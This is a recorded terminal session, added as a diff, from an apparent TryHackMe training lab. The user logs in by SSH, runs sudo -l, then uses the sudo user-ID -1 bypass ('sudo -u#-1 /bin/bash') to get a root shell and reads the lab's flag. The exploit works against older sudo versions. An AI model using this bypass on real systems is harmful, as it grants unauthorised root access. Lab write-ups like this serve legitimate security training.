@@ -1,0 +1,33 @@
+Script started on 2025-11-22 09:55:05+03:00 [COMMAND="ssh -p 2222 tryhackme@sudo.vulns.bypass.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="26"]
+The authenticity of host '[sudo.vulns.bypass.thm]:2222 ([10.10.161.82]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:4bgDOPxI7PFcv5CMfQYEkO7uBqKjLKhd7zZwmE8uwbQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[sudo.vulns.bypass.thm]:2222' (ED25519) to the list of known hosts.
+tryhackme@sudo.vulns.bypass.thm's password: 
+Last login: Fri Feb  7 00:14:41 2020 from 192.168.1.151
+]0;tryhackme@sudo-privesc: ~[01;32mtryhackme@sudo-privesc[00m:[01;34m~[00m$ sudo su
+[sudo] password for tryhackme: 
+Sorry, user tryhackme is not allowed to execute '/bin/su' as root on sudo-privesc.
+]0;tryhackme@sudo-privesc: ~[01;32mtryhackme@sudo-privesc[00m:[01;34m~[00m$ sudo -l
+Matching Defaults entries for tryhackme on sudo-privesc:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tryhackme may run the following commands on sudo-privesc:
+    (ALL, !root) NOPASSWD: /bin/bash
+]0;tryhackme@sudo-privesc: ~[01;32mtryhackme@sudo-privesc[00m:[01;34m~[00m$ sudo -u#-1 /bin/bash
+]0;root@sudo-privesc: ~[01;32mroot@sudo-privesc[00m:[01;34m~[00m# whoami
+root
+]0;root@sudo-privesc: ~[01;32mroot@sudo-privesc[00m:[01;34m~[00m# cd .[K/o[Kroot
+]0;root@sudo-privesc: /root[01;32mroot@sudo-privesc[00m:[01;34m/root[00m# ls
+root.txt
+]0;root@sudo-privesc: /root[01;32mroot@sudo-privesc[00m:[01;34m/root[00m# cat root.txt 
+THM{l33t_s3cur1ty_bypass}
+]0;root@sudo-privesc: /root[01;32mroot@sudo-privesc[00m:[01;34m/root[00m# exit
+exit
+]0;tryhackme@sudo-privesc: ~[01;32mtryhackme@sudo-privesc[00m:[01;34m~[00m$ exit
+logout
+Connection to sudo.vulns.bypass.thm closed.
+
+Script done on 2025-11-22 09:56:50+03:00 [COMMAND_EXIT_CODE="0"]
